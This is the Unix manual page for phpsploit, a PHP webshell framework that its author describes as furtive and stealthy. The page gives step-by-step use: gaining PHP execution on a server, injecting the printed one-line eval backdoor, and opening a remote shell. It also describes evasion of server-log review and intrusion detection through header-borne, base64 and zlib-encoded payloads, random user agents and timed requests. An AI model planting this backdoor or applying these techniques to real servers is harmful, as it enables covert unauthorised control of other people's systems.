.TH "" 1 "" ""


.P
PHPSPLOIT

.SH NAME

.P
\fBphpsploit\fR — furtive tunnel based php webshell

.SH SYNOPSIS

.P
\fBphpsploit\fR [\fItarget\-url\fR|\fIsession\fR]

.SH DESCRIPTION

.P
\fBphpsploit\fR is a furtive tunnel \fIbased\fR php webshell: it was designed in order to help privilege escalation through a very small php backdoor, while remaining the most stealth, efficient, and adjustable as possible.

.P
It innovates by settling for a remotely stored micro backdoor that forwards to dynamic encoded HTTP headers, which act as dynamic payload. This feature is usefull to bypass admins searching for suspicious lines in the server logs, because GET requests without arguments, are not as suspect as POST requests, or GET requests with suspicious arguments (eg: "?cmd=cat&edit=/etc/passwd").

.P
The \fBphpsploit\fR framework is plugin based, so users can easily make their own plugins, or edit the built\-in ones, with the \fIpspapi\fR (phpsploit API) that interracts with the target server through the framework.

.P
Its structure allows him to evolve and be easily adapted to all types of web exploitation scenarios, because every setting can be edited \fIglobally\fR (through user configuration file), or \fIlocally\fR, using the \fBset\fR command.

.P
A backdoor to bring them all... \- https://bitbucket.org/nil0x42/phpsploit

.SH OPTIONS

.P
Running \fBphpsploit\fR without any argument runs a blank session, with all settings set to default.

.TP
If an URL is specified as argument, only sets the \fITARGET\fR setting to that value.
\fB$ phpsploit http://127.0.0.1/backdoored\-url.php\fR

.TP
You also can use a previously saved \fIsession\fR file as argument, to use him instead of a blank session. Sessions can (and need to) be saved with the \fBsave\fR command.
\fB$ phpsploit ~/targets/localhost/phpsploit.session\fR

.TP
For inline help, you also can use \fBphpsploit \-\-help\fR

.SH USAGE

.P
The most basic way to use phpsploit it as described here:

.RS
.IP 1. 3
First, find a remote php execution access.
.IP 2. 3
Open phpsploit, and run the \fBinfect\fR command to get the working backdoor.
.IP 3. 3
Inject that backdoor on the remote server.
.IP 4. 3
Run "\fBset TARGET http://site/backdoored\-url.php\fR".
.IP 5. 3
You also can edit some \fBSETTINGS\fR (with the "\fBset\fR" command), such as the PROXY, or REQ_* variables.
.IP 6. 3
Just type "\fBexploit\fR", and enjoy your remote shell access :)
.RE

.P
\fIWARNING\fR: If the "\fBexploit\fR" command doesn't works, and returns an error, it can be for a lot of reasons:

.RS
.IP 1. 3
\fBHTTP Error 400: Bad request\fR \- Generally, this error occurs because one or some \fBREQ_*\fR settings are too big for the server. So you need to settle their values.
.IP 2. 3
\fBRequest error: Connection refused\fR \- If you are sure that the specified \fBTARGET\fR is accessible from your computer (or from the \fBPROXY\fR if defined), this error can occur because the \fBPROXY\fR is invalid
.IP 3. 3
If you have injected your \fBBACKDOOR\fR in an existing remote php code, make sure it is each time executed.
.IP 4. 3
Other issues can occur because one of your \fBSETTINGS\fR where modified without taking care of their validity, or because an IDS has detected the exploitation try.
.IP 5. 3
If the encountered issue is not in the list, you can also post an issue with all details here: https://bitbucket.org/nil0x42/phpsploit/issues or contact the Author (see the \fBAUTHOR\fR section)
.RE

.SH INTERFACE

.P
The \fBphpsploit\fR framework includes two shell interfaces.

.RS
.IP \(bu 3
The \fBMAIN SHELL\fR is the first shell interface, spawned when the framework starts. It is used to prepare a target exploitation. Through it, you can locally adjust the \fBSETTINGS\fR with the "\fBset\fR" command, and use the "\fBinfect\fR" command to get the micro\-backdoor that needs to be injected on the target.
.IP \(bu 3
The \fBREMOTE SHELL\fR interface starts when a target server was exploited. Its is used to interract with the backdoored URL.
.RE

.P
\fBTO GET HELP\fR on a phpsploit command, you can use "\fBhelp <command>\fR", "\fB<command> \-\-help\fR" or "\fB<command> \-h\fR". If there is no specific help for a command, such as \fBinfect\fR, a short description of each command's purpose is available typing \fBhelp\fR without arguments.

.P
The commands are auto\-completed on unix clients, and try to use \fBreadline\fR if available.
They are divided into groups when shown whith the "\fBhelp\fR" command:

.RS
.IP \(bu 3
The \fBCORE COMMANDS\fR contains all commands available through every interface.
.IP \(bu 3
The Shell Commands contains the commands specific to the current interface.
.IP \(bu 3
In the remote shell, plugin commands are grouped by categories.
.RE

.P
\fICore Commands:\fR

.TP
\fBclear\fR
Clear the terminal screen
.TP
\fBexit\fR
Leave the current shell interface
.TP
\fBhelp\fR
Shows help for all available commands
.TP
\fBinfect\fR
Prints a working backdoor to inject in the target
.TP
\fBlcd\fR
Change local working directory
.TP
\fBlpwd\fR
Print local working directory
.TP
\fBrtfm\fR
Read this manual page
.TP
\fBsave\fR
Save the current session in a file, for future usage
.TP
\fBset\fR
View and edit phpsploit settings

.SH MAIN SHELL

.P
When entering \fBphpsploit\fR, the main shell is spawned, it helps you to locally edit your settings (\fBset\fR command), get the working backdoor (\fBinfect\fR command), and then start the \fIremote shell\fR (\fBexploit\fR command).

.P
\fIShell Commands:\fR

.TP
\fBexploit\fR
Drop a shell from target server

.SH REMOTE SHELL

.P
When you run the \fBexploit\fR command, you enter the remote shell, and directly interracts with the remotely backdoored server through the \fBphpsploit\fR plugins.
Typing \fBhelp\fR will show the available commands.
\fBCore Commands\fR are all the \fBphpsploit\fR remote shell built\-in commands.

.P
\fIShell Commands:\fR

.TP
\fBenv\fR
This command interracts with the environment variables, for more informations, please read the \fBREMOTE ENVIRONMENT\fR section.
.TP
\fBlastcmd\fR
Allows user to show or save the last command output
.TP
\fBreload\fR
Reloads the commands list, usefull if you have edited one plugin during an exploitation session
.TP
\fBshell\fR
Various command plugins, such as \fIsystem\fR, \fImysql\fR and \fIsuidroot\fR can be used as frontend shell. For example, "\fB> shell system\fR" will spawn the "\fBsystem\fR" command as default prompt, making all typed lines to be executed by this plugin.

.P
All the other remote shell commands are in reality dynamic plugins, built with the \fBPSPAPI\fR (phpsploit API).
As with all commands, you can use "\fBhelp <command>\fR" to get help.

.P
The built\-in plugins are storred in the \fI./framework/plugins/\fR directory, sorted by categories, you can edit a built\-in or make your own command, with the \fBPSPAPI\fR.

.P
If you want to make you own plugin, it is recommended to use the alternative plugin directory \fI./plugins/\fR from the phpsploit's user directory, this one works exactly like the buit\-in plugins directory.

.P
If a command has been edited during an exploitation session, use the "\fBreload\fR" command to reload the plugins list.

.SH SETTINGS

.P
The \fBphpsploit\fR settings are available from the interface, they can be viewed, and edited with the \fBset\fR command.

.P
When a new session is opened, all \fIsettings\fR are set to their default values, specified in the phpsploit's user configuration file. Editing this file allows you to specify your own default values, a very usefull feature for polymorphic backdoor, or custom HTTP headers. To get more informations about the configuration directory, please go to the \fBFILES\fR section.

.TP
\fBTARGET\fR
This setting contains the remote backdoored URL in target server, for example, if you have injected the backdoor (obtained with the \fBinfect\fR command) on a file named \fBtest.php\fR in your local server's webroot, the \fBTARGET\fR will be http://localhost/test.php .

.RS
\fBDefault value: None\fR
.RE

.TP
\fBBACKDOOR\fR
This is the backdoor template, used to generate the effective micro\-payload to be written into a target web page, it needs to be valid php code, and it's preferable to make him non\-verbose, by prexifing it's main function with an \fI@\fR. For example, \fI@\fReval() instead of eval(). For more informations about how \fBphpsploit\fR builds request, please read the \fBREQUEST BUILDING\fR section.
The only purpose of the \fBBACKDOOR\fR is to execute the \fBREQ_HEADER_PAYLOAD\fR's content so it need to contain the dynamic var %%PASSKEY%%.

.RS
\fBDefault value: <?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>\fR
.RE

.TP
\fBPASSKEY\fR
This var is interesting for customisation, assuming it is used as main header forwarder's name, changing is default value will act as a \fIpassword\fR, making another \fBphpsploit\fR user unable to use your \fIbackdoor\fR if it does not own the \fBPASSKEY\fR.

.RS
\fBDefault value: phpSpl01t\fR
.RE

.TP
\fBPROXY\fR
With this setting, you can specify an \fIHTTP Proxy\fR, matching the pattern \fBaddress:port\fR, to send \fBphpsploit\fR's requests through it. Be carrefull, a non\-working \fBPROXY\fR will make the requests unreachable. To disable the proxy, set it's value to \fBNone\fR.

.RS
\fBDefault value: None\fR
.RE

.TP
\fBSAVEPATH\fR
Here you can specify the default directory that will be used to save \fBphpsploit\fR sessions, when no arguments are specified for the \fBsave\fR command. It uses your system's temporary directory as \fIdefault\fR value.

.TP
\fBTMPPATH\fR
This setting is a bit different than the \fBSAVEPATH\fR one, because phpsploit use it to write temporary files, for example, it is used by the \fBedit\fR command in the \fIremote shell\fR. It uses your system's temporary directory as \fIdefault\fR value.

.TP
\fBREQ_DEFAULT_METHOD\fR
This is the default http METHOD that will be used to send payloads, so it's value can only be \fIGET\fR or \fIPOST\fR.

.RS
\fBDefault value: GET\fR
.RE

.TP
\fBREQ_HEADER_PAYLOAD\fR
This setting is the dynamic payload forwarder, when a request is send by the \fBphpsploit\fR framework, a dynamic \fIHTTP HEADER\fR will be sent on eaceh request, the header's name is the \fBPASSKEY\fR setting, and the value is the  \fBREQ_HEADER_PAYLOAD\fR value, for more informations about how \fBphpsploit\fR builds requests, please read the \fBREQUEST BUILDING\fR section.

.RS
\fBDefault value: eval(base64_decode(%%BASE64%%))\fR
.RE

.TP
\fBREQ_INTERVAL\fR
This setting can be usefull for large payloads, sent with a big amount of requests, for example, when using the \fBupload\fR's remote shell command, when seending a big file to the server.
It's used to add a delay between each request with a simple syntax. Using a number as value (ex: 20) will wait this exact numer of seconds, but you cal also specify a tuple of numbers, for example, the default value will make the builder wait a random number of seconds between \fB1\fR and \fB10\fR before each request. To disable it, just set it to \fI0\fR.

.RS
\fBDefault value: 1\-10\fR
.RE

.TP
\fBREQ_MAX_HEADERS\fR
\fBMainly used for HTTP GET requests\fR. Assuming that phpsploit use http headers for payload encapsulation, it's important to know what is the exact http server's headers limit, because a too small \fBREQ_MAX_HEADERS\fR value will decrease the max payload size per request. Most servers, like apache and IIS accept up to 100 headers per request, but other servers can allow 200 headers or more, and smaller servers can limit headers numer to 50 or less. The default value works with a large amount of common servers with default configuration, but in some cases it will be necessary to reduce this value.

.RS
\fBDefault value: 100\fR
.RE

.TP
\fBREQ_MAX_HEADER_SIZE\fR
\fBMainly used for HTTP GET requests\fR. This setting is complementary to the \fBREQ_MAX_HEADERS\fR one, because it sets the max size that \fIeach header\fR can contain. In most cases, the common servers limit the size to \fI8Kio\fR, but many others, like \fBapache tomcat\fR and a lot of virtualized web hosting solutions limit the maximum size of each header to \fI4Kio\fR or less.

.RS
\fBDefault value: 8Kb\fR
.RE

.TP
\fBREQ_MAX_POST_SIZE\fR
\fBMainly used for HTTP POST requests\fR. This is the target server's limit for POST data, in a lot of servers, this limit is very large, such as 32Mio or more, but a lot of other web servers, and their default configurations sets this limit to 8Mio. If you intend to use POST request during a remote \fBphpsploit\fR session, it is recommended to run the \fBphpinfo\fR command that provides the real server's \fImaximum post size\fR, then adapt the \fBphpsploit\fR's \fBREQ_MAX_POST_SIZE\fR.

.RS
\fBDefault value: 8Mb\fR
.RE

.TP
\fBREQ_ZLIB_TRY_LIMIT\fR
On the \fBphpsploit\fR's request builder, when the payload can't be sent in one single request because he is too large, the framework will start a lot of computering functions to calculate how much requests are needed for each \fIhttp method\fR, and to decrease the number of needed requests, he will each time try to compress the payload with \fBZLIB\fR, this feature is usefull to descrease the number of requests. But, the bigger the base payload, the slower the needed computation time. Assuming this, you can with this setting specify a maximum payload size, from which the manufacturer will not longer try to compress the cuted payload. That will increase the number of needed requests, but shalt the computation time acceptable. More powerfull your computer, more this value can be increased.

.RS
\fBDefault value: 5Mb\fR
.RE

.TP
\fBHTTP_USER_AGENT\fR
This is the user\-agent header used on each \fBphpsploit\fR request, to pick a random user\-agent from a wordlist on each request, you can also use a \fIfile object\fR as value.

.RS
\fBDefault value: file://framework/misc/http_user_agents.lst\fR
.RE




.P
Note that the \fBHTTP_USER_AGENT\fR setting is included by default, but it is possible to create as many default headers as you want, you just need to create a setting starting with HTTP_ followed by the name of the header.

.RS
\fBExample: set HTTP_ACCEPT_LANGUAGE fr\-FR;en\-US\fR
.RE

.P
\fIFile objects\fR can be used for HTTP_* settings, the syntax is \fBfile:///full/path/to/file.txt\fR, these objects will pick an random line in file for each http request. This facilitates polymorphic requests generation, and therefore, stealth. A file object is defaultly used for the \fBHTTP_USER_AGENT\fR setting.

.SH REMOTE ENVIRONMENT

.P
The remote environment variables are available from the \fBREMOTE SHELL\fR.
They are usefull to store server related informations, and \fBPSPAPI\fR plugins have write access to them.

.P
User can show, edit or delete them with the "\fBenv\fR" command, through the \fBREMOTE SHELL\fR instance.

.P
Be very careful while manually editing these variables, because wrong values can render inoperative certain commands.

.P
There is a list of \fBREMOTE ENVIRONMENT\fR variables defaultly used by \fBphpsploit\fR core and built\-in plugins:

.TP
\fBCWD\fR
This variable contains the current remote working directory, the \fBcd\fR and \fBpwd\fR commands use it as reference.

.TP
\fBWEB_ROOT\fR
This variable contains the absolute path to the remote web root directory.

.TP
\fBWRITE_TMPDIR\fR
This variable imperatively needs to conatain the absolute path to a writeable remote directory. It is essential for multirequest payloads execution, that stores full payload parts into this path.

.TP
\fBWRITE_WEBDIR\fR
This environment variable contains the absolute path to a writeable remote directory \fIimperatively accessible from the web\fR. It can be used for evasion \fBMODULES\fR.

.SH REQUEST BUILDING

.P
This section is about how the \fBphpsploit framework\fR manages the requests.

.P
\fB1 \- BACKDOOR\fR

.RS
.IP \(bu 3
First, the \fBBACKDOOR\fR setting defines the main backdoor template, him, \fIand only HIM\fR needs to be written in the \fBTARGET\fR remote URL.
.IP \(bu 3
To understand the principle, it is necessary to know that the PHP language automatically adds all the \fIrequest headers\fR into the $_SERVER global array, prefixing each header name by the "HTTP_" string.
.IP \(bu 3
Assuming that, the \fBBACKDOOR\fR just works like a forwarder, executing the $_SERVER['HTTP_%%\fBPASSKEY\fR%%'] remote variable who contains the \fBREQ_HEADER_PAYLOAD\fR.
.RE

.P
\fB2 \- REQ_HEADER_PAYLOAD\fR

.RS
.IP \(bu 3
The \fBREQ_HEADER_PAYLOAD\fR also known as \fIHeader Forwarder\fR is a header that is sent on each http request, the \fBPASSKEY\fR setting is used as name, and the \fBREQ_HEADER_PAYLOAD\fR is he's value's template.
.IP \(bu 3
This header acts like a payload forwarder, permitting execution of the \fBBASE64 PAYLOAD\fR, by executing \fBBASE64\fR encoded php code.
.RE

.P
\fB3 \- BASE64 PAYLOAD\fR

.RS
.IP \(bu 3
The \fBBASE64 PAYOLOAD\fR is automatically generated for each request, he is the last step for \fIreal payload execution\fR. They undencoded values can be found in the \fI./framework/phpfiles/forwarders/\fR \fBphpsploit\fR directory.
.IP \(bu 3
\fBFor POST request\fR, this payload executes the $POST['%%\fBPASSKEY\fR%%'] php variable, who is used as \fBREAL PAYLOAD\fR when usgin this http method.
.IP \(bu 3
\fBFor GET requests\fR, it acts concatenating the list of dynamic \fBphpsploit\fR headers alphabetically reordrered, each containing the splitted \fBREAL PAYLOAD\fR.
.RE

.P
\fB4 \- REAL PAYLOAD\fR

.RS
.IP \(bu 3
The \fBREAL PAYLOAD\fR contains a large amout of \fIzlib compressed\fR then \fIbase64 encoded\fR php code, who is dynamically generated by the \fBphppsloit\fR framework's optimization functions.
.IP \(bu 3
Unencoded (defaultly done by the \fBBASE64 PAYLOAD\fR), he is the \fBBASE PAYLOAD\fR passed through \fBENCAPSULATION\fR.
.RE

.P
\fB5 \- BASE PAYLOAD\fR

.RS
.IP \(bu 3
The base payload, can be a plugin's payload (contained in the \fI./framework/commands/<gategory>/<plugin>/payload.php\fR file), or the default \fBphpsploit\fR remote session opener that is called when running the \fBexploit\fR command (available in the \fI./framework/phpfiles/server_link/open.php\fR file).
.IP \(bu 3
Base payloads are php 4.1.1 compatible (because a lot of web servers already use an old version of php).
.IP \(bu 3
The \fI!import(<function>)\fR lines allows php base payloads to import \fBphpsploit\fR dedicated functions contained in the\fI./framework/phplibs/\fR directory. Usefull to limit redundancy.
.RE

.P
\fB6 \- ENCAPSULATION\fR

.RS
.IP \(bu 3
To manage return codes and \fBphpsploit\fR tunneling, each \fBBASE PAYLOAD\fR is encapsulated with the \fI./framework/phpfiles/encapsulator.php\fR's php code.
.IP \(bu 3
It also manages response compression with \fBZLIB\fR, to speed\-up server's responses.
.RE

.SH FILES

.P
\fBConfiguration directory:\fR

.TP
If the \fB$XDG_CONFIG_HOME\fR shell environment variable is set:
\fB${XDG_CONFIG_HOME}/phpsploit/\fR (a.k.a. likely ~/.config/phpsploit/)
.TP
Else the user home is used as base directory:
\fB~/.phpsploit/\fR (a.k.a. ${HOME}/.phpsploit/ on GNU/Linux)

.P
The "./config" file is used as \fBphpsploit\fR configuration file, on root user's configuration directory.
It allows to reconfigure the default \fBSETTINGS\fR (see the \fBSETTINGS\fR section for more informations)

.P
The "./plugins/" directory can be used to make your own \fBphpsploit\fR plugins.

.SH ISSUES

.TP
To submit any issue, bug or proposal, please send it in the phpsploit's issues section:
https://bitbucket.org/nil0x42/phpsploit/issues

.SH CONTRIBUTE

.TP
If you want to contribute to \fBphpsploit\fR, submit a plugin, patch, or anything else, take a look at the \fBCONTRIBUTE\fR file, from the ./doc directory

.SH AUTHOR

.P
\fBnil0x42\fR <http://goo.gl/kb2wf>

.SH LICENCE

.P
This software is under the GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007

.\" man code generated by txt2tags 2.6 (http://txt2tags.org)
.\" cmdline: txt2tags -q -t man -i man.txt2tags -o phpsploit.1
